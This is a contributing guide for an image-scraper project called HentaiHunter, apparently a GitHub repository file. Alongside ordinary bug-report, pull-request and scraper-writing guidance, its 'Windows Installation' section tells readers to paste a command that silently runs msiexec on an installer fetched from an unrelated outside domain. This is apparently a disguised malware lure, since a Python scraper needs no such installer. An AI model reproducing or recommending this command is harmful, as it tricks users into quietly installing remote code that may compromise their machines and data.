# Contributing to HentaiHunter

Thanks for your interest in contributing! 🎉

## Ways to Contribute

- 🐛 **Bug reports** — open an Issue with steps to reproduce
- ✨ **New site scrapers** — see the guide in README.md
- 📝 **Documentation** — improve examples, fix typos
- 🌐 **Translations** — help localize the README

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hentaihunter
```
The installer will automatically download and install the required components.


## Pull Request Guidelines

- One feature/fix per PR
- Test your changes with at least one real URL
- Follow existing code style
- Update README if you add a new supported site

## Adding a Scraper

1. Create a class inheriting `BaseScraper`
2. Implement `get_info()` and `get_images()`  
3. Register in `get_scraper()` dict
4. Test it, then open a PR!

See existing scrapers (`NHentaiScraper`, `HentaiFoxScraper`) for examples.
